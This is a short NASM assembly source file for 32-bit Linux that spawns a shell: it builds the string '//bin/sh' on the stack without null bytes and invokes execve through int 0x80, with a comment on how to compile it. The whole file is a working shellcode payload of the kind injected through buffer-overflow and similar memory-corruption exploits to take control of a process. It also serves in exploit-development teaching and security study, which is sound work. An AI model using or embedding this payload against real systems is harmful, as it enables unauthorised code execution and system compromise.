; Compile with NASM: "nasm filename"
[BITS 32]				; 32 BIT code
	xor eax, eax
	push eax			; Push 0x0 to the stack
	push "n/sh"			; Push "//bin/sh" to the stack
	push "//bi"			; --
	mov ebx, esp		; ebx = program name

	push eax
	mov edx, esp
	push ebx
	mov ecx, esp

	; int execve(const char *filename,char *const argv[],char *const envp[])
	mov al, 0x0b		; execve call code
	int 0x80			; call kernel
